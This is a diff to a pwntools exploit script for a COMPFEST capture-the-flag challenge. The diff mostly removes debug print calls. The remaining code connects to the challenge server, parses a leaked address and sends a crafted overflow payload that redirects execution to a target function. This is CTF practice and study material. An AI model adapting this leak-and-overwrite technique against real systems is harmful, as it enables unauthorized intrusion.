@@ -2,17 +2,17 @@ from pwn import *
 
 def recvmenu():
     for i in range(8):
-        print(conn.recvline())
+        conn.recvline()
 
 conn = remote('challenges.ctf.compfest.id', 20008)
 
 recvmenu()
 
 conn.sendline(b'2')
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
+conn.recvline()
+conn.recvline()
+conn.recvline()
+conn.recvline()
 # Get the treasure
 harta_karun = conn.recvline()[18:30]
 # Calculate `salty_spitoon` address
@@ -30,28 +30,12 @@ conn.sendline(b'1')
 payload = ("\x00"*60+"\x01"+"\x00"*3+"\x01"+"\x00"*7).encode("utf-8") + target
 print(payload)
 conn.sendline(payload)
-print(conn.recvline())
+conn.recvline()
 
 recvmenu()
 
 conn.sendline(b'3')
 # goooooooooooooooooooooooooooooo
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
-print(conn.recvline())
 print(conn.recvline())
 print(conn.recvline())
 print(conn.recvline())
